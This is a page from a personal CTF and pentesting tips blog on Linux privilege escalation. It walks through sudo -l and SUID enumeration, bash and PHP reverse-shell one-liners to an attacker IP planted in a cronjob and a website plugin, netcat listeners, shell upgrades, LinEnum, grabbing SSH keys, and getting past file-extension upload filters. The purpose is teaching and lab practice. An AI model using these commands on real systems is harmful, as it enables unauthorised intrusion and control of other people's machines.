<!DOCTYPE html>




<html
 dir="ltr"
 lang="en"
 >
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="theme-color" content=#ffffff>
    <link rel="stylesheet" href="/assets/css/app.css">
    <link rel="shortcut icon" type="image/png"
           href="/favicon.png" 
    />
    <script defer src="https://unpkg.com/alpinejs@3.9.0/dist/cdn.min.js"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
    
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma-social@1/bin/bulma-social.min.css">
    
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Privilege Escalation | Wesley Kent</title>
<meta name="generator" content="Jekyll v4.2.2" />
<meta property="og:title" content="Privilege Escalation" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="The MANY different ways to escalate privileges" />
<meta property="og:description" content="The MANY different ways to escalate privileges" />
<link rel="canonical" href="http://localhost:4000/tipsandtricks/privilegeescalation/" />
<meta property="og:url" content="http://localhost:4000/tipsandtricks/privilegeescalation/" />
<meta property="og:site_name" content="Wesley Kent" />
<meta property="og:image" content="http://localhost:4000/home/wesleyvm1/WesleyKentBlog/assets/fe.ico" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/home/wesleyvm1/WesleyKentBlog/assets/fe.ico" />
<meta property="twitter:title" content="Privilege Escalation" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"The MANY different ways to escalate privileges","headline":"Privilege Escalation","image":"http://localhost:4000/home/wesleyvm1/WesleyKentBlog/assets/fe.ico","url":"http://localhost:4000/tipsandtricks/privilegeescalation/"}</script>
<!-- End Jekyll SEO tag -->

    <!-- head scripts --></head>

  <body>
    <nav class="navbar is-primary " x-data="{ openNav: false }">
    <div class="container">
        <div class="navbar-brand">
            <a href="/" class="navbar-item">
                Wesley Kent
            </a>
            <a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false" data-target="navMenu" :class="{ 'is-active': openNav }" x-on:click="openNav = !openNav">
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
            </a>
        </div>
        <div class="navbar-menu" id="navMenu" :class="{ 'is-active': openNav }">
            <div class="navbar-start">
                <a href="/" class="navbar-item ">Home</a>
                
                
                    
                    <a href="/blog/" class="navbar-item ">CTF Exploits</a>
                    
                
                    
                    <div class="navbar-item has-dropdown is-hoverable ">
                        <a href="/tipsandtricks/" class="navbar-link is-active">Tips and Tricks</a>
                        <div class="navbar-dropdown">
                            
                            <a href="/tipsandtricks/bruteforcing/" class="navbar-item ">Brute forcing</a>
                            
                            <a href="/tipsandtricks/privilegeescalation/" class="navbar-item is-active">Privilege Escalation</a>
                            
                            <a href="/tipsandtricks/webstuff/" class="navbar-item ">Web Stuff</a>
                            
                            <a href="/tipsandtricks/usingnmap/" class="navbar-item ">Using Nmap</a>
                            
                            <a href="/tipsandtricks/steganography/" class="navbar-item ">Steganography</a>
                            
                            <a href="/tipsandtricks/defaultpayloads/" class="navbar-item ">Default payloads and msfconsole</a>
                            
                            <a href="/tipsandtricks/thebasics/" class="navbar-item ">The Basics</a>
                            
                        </div>
                    </div>
                    
                
                    
                    <div class="navbar-item has-dropdown is-hoverable ">
                        <a href="/resources/" class="navbar-link ">Resources</a>
                        <div class="navbar-dropdown">
                            
                            <a href="/resources/usefullinks" class="navbar-item ">Useful links</a>
                            
                            <a href="/resources/freshinstall" class="navbar-item ">Fresh Install</a>
                            
                        </div>
                    </div>
                    
                
                    
                    <a href="/raspberrypi/" class="navbar-item ">Raspberry Pi Projects</a>
                    
                
                    
                    <a href="/femoldark/" class="navbar-item ">FE Moldark</a>
                    
                
                    
                    <a href="/contact/" class="navbar-item ">Contact</a>
                    
                
                    
                    <a href="/about/" class="navbar-item ">About</a>
                    
                
                
            </div>

            <div class="navbar-end">
                
            </div>

        </div>
    </div>
</nav>

    
        <section class="hero  is-medium  is-bold is-primary" >
    <div class="hero-body ">
        <div class="container">
            <h1 class="title is-2">Privilege Escalation</h1>
            <p class="subtitle is-3">The MANY different ways to escalate privileges</p>
            
        </div>
    </div>
</section>
    
    


    <section class="section">
        <div class="container">
            <div class="columns is-multiline">
                
                <div class="column is-12">
                    
                    
                    
                    
                    
<div class="content">
    <h1 id="introduction">Introduction</h1>
<p>Alrighty, so there’s a lot. I’m unsure how far into this I should go before I lose my mind alongside you, so this might be briefer than it could be. We shall see.
<br /><br />
To better qualify the situation - privilege escalation implies you already have some type of access to a system, say through a basic end user that had a poor password. The following scenarios imply you already have a shell of some kind, and you are looking to exploit that and get to the point where you are running the shell as an admin / root or at least can execute commands as an admin / root.
<br /><br /><br /></p>
<h1 id="lets-start-with-sudo--l-and-suid-permissions">Let’s start with sudo -l and SUID permissions</h1>
<p>One of the go to commands once you’ve established yourself within a shell on a system is a quick <code class="language-plaintext highlighter-rouge">sudo -l</code>. Takes 2 seconds and only another 30 seconds to check if anything from that might be helpful. What that does is list the commands that you can run as sudo, on a properly configured system this should be all but zero for normal users.
<br /><br />
Let’s say there is an improperly configured system that allows you to run <code class="language-plaintext highlighter-rouge">/usr/bin/less</code> with sudo rights. This could lead to you reading files that you should not have access to. The easiest way to discover if there is a way to exploit whatever is listed from the <code class="language-plaintext highlighter-rouge">sudo -l</code> command is to reference <a href="https://gtfobins.github.io/">gtfobins</a>. They have a <em>massive</em> library of ways to bypass restrictions and escalate your privileges - their site will be referenced multiple times.
<br /><br />
On a very similar note, we can use files that have the SUID permissions (can run files with the owner’s privileges) to escalate our privileges. We can check what files like this exist by entering <code class="language-plaintext highlighter-rouge">find / -perm -u=s -type f 2&gt;/dev/null</code>. This is very similar to any other find command, what this searches for are files that contain those SUID permissions. And again, if this returns you a list reference gtfobins for any known exploits from them.
<br /><br /><br /></p>

<h1 id="uploading-reverse-tcp-shells">Uploading reverse tcp shells</h1>
<p>There are numerous ways you can start a reverse shell, I’ve modified plugins for a blog, replaced a file that was used by a cronjob, there’s a range of ways.
<br /><br />
A great site for this is <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a>, as they offer some quick commands that, once edited for your IP address and port, can start those shells via bash, perl, python, php and other methods. They also have more material on that side beyond just how to start reverse shells, including stuff relating to SQL injection and more notes on John.
<br /><br />
Back to the reverse shell side of things, let’s use the example I mentioned with modifying the file used by the cronjob. Essentially I was able to edit in the following command to a cronjob that executed every minute, and what I appended to that file was the following:<br />
<code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/10.18.91.219/8000 0&gt;&amp;1</code><br /><br />
While in another tab I had a netcat listener on that same port:<br />
<code class="language-plaintext highlighter-rouge">nc -lvnp 8000</code><br /><br />
Basically what this two step process is saying is:<br /></p>
<ul>
  <li>First, upload a reverse shell somehow, that will somehow be called (examples given here were as activated plugins or a cronjob)</li>
  <li>And then second, you need to be listening on the same port that the reverse shell is trying to reach you at. When that command executes it will try to initiate that connection over port <code class="language-plaintext highlighter-rouge">8000</code> at my IP address of <code class="language-plaintext highlighter-rouge">10.18.91.219</code>. If I am not listening over that port I will miss the connection<br /><br /></li>
</ul>

<p>The other example with the plugin I forget exactly how it was worded, but I do recall I was able to gain a foothold into their website editor and from there I could edit their plugins. I edited one of their already active plugins with something like:<br />
<code class="language-plaintext highlighter-rouge">php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code><br /><br />
And then curled the location for that specific php plugin, which started the reverse shell, and my netcat listener was already waiting.<br /><br /></p>

<p>There are many different ways you can initiate that reverse shell, it all comes down to what you have access to, what you should modify, and your permissions for those files.
<br /><br /><br /></p>

<h1 id="upgrading--starting-shells">Upgrading / starting shells</h1>
<p>Sometimes you might find that you have established a shell to a machine, but it is not the best or maybe not as stable as you would like. Some simple ways to do this include through python and perl, although there are more.
<br /><br />
With python that would be:<br />
python -c ‘import pty;pty.spawn(“/bin/bash”)’
<br /><br />
Through perl:<br />
perl -e ‘exec “/bin/sh”;’
<br /><br /><br /></p>

<h1 id="reoccuring-jobs--tasks-on-machines">Reoccuring jobs / tasks on machines</h1>
<p>Also known as cronjobs, although there are different kinds. Sometimes these will run exploitable or editable tasks periodically. If you can find a way to change them directly, or resources / modules they interact with, this can be yet another way to gain access to more information or escalate your access. On most linux distributions you will find this at <code class="language-plaintext highlighter-rouge">/etc/crontab</code>. You can access this with a text editor or with <code class="language-plaintext highlighter-rouge">crontab -e</code>.
<br /><br /><br /></p>

<h1 id="linenum">LinEnum</h1>
<p>This is another tool that can be found on GitHub, and can provide useful information on a target machine if you can get the permissions needed to run it. It does a lot of the things that are mentioned on this page automatically and generates a report for you to view later. Once you are on the machine you can get the file via wget or curl to the <code class="language-plaintext highlighter-rouge">/tmp</code> directory and work from there. The bash file is located <a href="github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">here</a>.<br /><br />
Note: You may or may not need to <code class="language-plaintext highlighter-rouge">chmod +x</code> that file to give yourself executable permissions on it.
<br /><br /><br /></p>

<h1 id="other">Other</h1>
<p>Anytime you can find ssh keys, grab ‘em. Reference the <a href="/tipsandtricks/bruteforcing/">bruteforcing</a> page for ways to crack those and use them to your advantage.
<br /><br />
As mentioned before, sometimes gaining that next foothold includes uploading e.g. php files to start a reverse tcp shell with yourself. However, depending where you upload they might restrict you to only certain types of files, or disallow certain types of files. Some ways to <em>maybe</em> get around this is capitilize letters like .Php or .phP instead of .php, maybe see if it’ll accept a .phtml file, etc. You get the idea. Security controls are meant to secure something otherwise not secure, but that doesn’t mean they account for everything.</p>

<p>The myriad of ways for privilege escalation. At a glance, knowing how to list files / programs that have higher privileges, increasing your shell’s capabilities, modifying access controls, I don’t know there’s a lot to go over here, check out the page for more info.</p>

</div>
                </div>
                
            </div>
        </div>
    </section>
    
        <footer class="footer">
    <div class="container">
        
        

        <div class="content is-small has-text-centered">
            <p class="">Theme built by <a href="https://www.csrhymes.com">C.S. Rhymes</a></p>
        </div>
    </div>
</footer>

    
    <script src="/assets/js/app.js" type="text/javascript"></script><!-- footer scripts --></body>
</html>
